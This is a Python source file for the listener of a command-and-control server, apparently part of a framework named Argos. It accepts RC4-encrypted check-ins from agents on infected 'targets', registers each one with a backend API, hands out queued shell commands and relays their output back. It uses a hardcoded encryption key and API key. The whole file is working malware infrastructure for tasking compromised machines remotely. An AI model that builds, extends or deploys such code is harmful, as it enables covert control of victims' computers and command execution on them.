# TODO what happens when multiple commands are in the pipeline not yet pulled ?
import requests
import asyncio
import uuid

from Crypto.Cipher import ARC4


def encrypt_rc4(key, plaintext):
    cipher = ARC4.new(key)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext



PORT = 13337
ARGOS_SERVER_URL = "http://127.0.0.1:5000"
API_KEY = "123456789"
SECRET_KEY = b"ArgosRc4Key!!"


anonymous = 'f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0'
clients = {}


def argos_create_new_target(target_data):
    new_target = requests.post(f"{ARGOS_SERVER_URL}/api/v1/new_target", 
                                headers={ 'Authorization': API_KEY},
                                data=target_data).json()
    
    if not new_target['success']:
        return -1

    return new_target['data']['id']


def get_target_info(target_uid):
    target = requests.get(f"{ARGOS_SERVER_URL}/api/v1/get_target?uid={target_uid}",
                            headers={ 'Authorization': API_KEY},).json()

    if not target['success']:
        return None
    return target


def get_job_for_target(target_uid):
    jobs_raw = requests.get(f"{ARGOS_SERVER_URL}/api/v1/current_jobs", 
                                headers={ 'Authorization': API_KEY}).json()

    if not jobs_raw['success']:
        return None

    jobs = jobs_raw['data']
    for job in jobs:
        if job['target_uid'] == target_uid:
            return job

    return None


def send_command_output(command_id, output):
    data = {
        "command_id": command_id,
        "output": output
    }
    response = requests.post(f"{ARGOS_SERVER_URL}/api/v1/output", 
                                headers={ 'Authorization': API_KEY },
                                data=data).json()
    print(response)


def heartbeat(target_uid):
    data = { 'target_uid': target_uid }
    requests.post(f"{ARGOS_SERVER_URL}/api/v1/heartbeat",
                  headers={ 'Authorization': API_KEY },
                  data=data)


def uncorrupt_data(data):
    final_string = ""
    for char in data:
        final_string += chr(char)

    return final_string


class ServerHandler(asyncio.Protocol):
    def connection_made(self, transport):
        """
        Called by asyncio on connection
        """
        self.transport = transport

    def data_received(self, data):
        """
        Called by asyncio when data is received
        """
        message = uncorrupt_data(encrypt_rc4(SECRET_KEY, data))
        message_parts = message.split(':')
        uniq_id, data = message_parts[0], ':'.join(message_parts[1:])

        # We first check if the agent is anonymous
        if uniq_id == anonymous:
            client_id = str(uuid.uuid4())
            clients[client_id] = {
                'uid': client_id,
                'display_name': data.strip('\n'),
                'ip_addr': self.transport.get_extra_info('peername')[0]
            }

            target_id = argos_create_new_target(clients[client_id])
            if target_id == -1:
                print("[FATAL] - Error while creating new target, id returned is -1")
                return

            print("sending id")
            self.transport.write(encrypt_rc4(SECRET_KEY, client_id.encode()))
            self.transport.close()
            print(f"[DEBUG] - new target created uid: {client_id}")

        else:
            # We then look for him in our dict
            client = clients.get(uniq_id)
            # If he does not exist, we try to id him
            if client is None:
                client_data = get_target_info(uniq_id)['data']
                if client_data is None:
                    print(f"[DEBUG] - uknown target tried to contact us ({uniq_id}), ignoring.")
                    return
                
                clients[uniq_id] = {
                    'uid': uniq_id,
                    'display_name': client_data['display_name'],
                    'ip_addr': client_data['ip_addr']
                }

            # Once we know who it is, we check what does he want
            # either pull a command (=sent only it's id) or send an output (id + output)
            heartbeat(uniq_id)
            if not data:
                job = get_job_for_target(uniq_id)
                if job is None:
                    self.transport.write(b"")
                    self.transport.close()
                    print(f"[DEBUG] - {uniq_id} pulled but have nothing to do.")
                    return

                print(f"[DEBUG] - sent {job['command']}({job['command_id']}) to {uniq_id}.")
                self.transport.write(encrypt_rc4(SECRET_KEY, f"{job['command_id']}:{job['command']}".encode()))
            else:
                data_parts = data.split(':')
                command_id, command_output = data_parts[0], ':'.join(data_parts[1:])
                
                print(f"[DEBUG] - {uniq_id} sent back data for command {command_id}.")

                send_command_output(command_id, command_output)
        
        self.transport.close()


async def main():
    loop = asyncio.get_running_loop()

    server = await loop.create_server(ServerHandler, '0.0.0.0', PORT)
    async with server:
        await server.serve_forever()
    


asyncio.run(main())
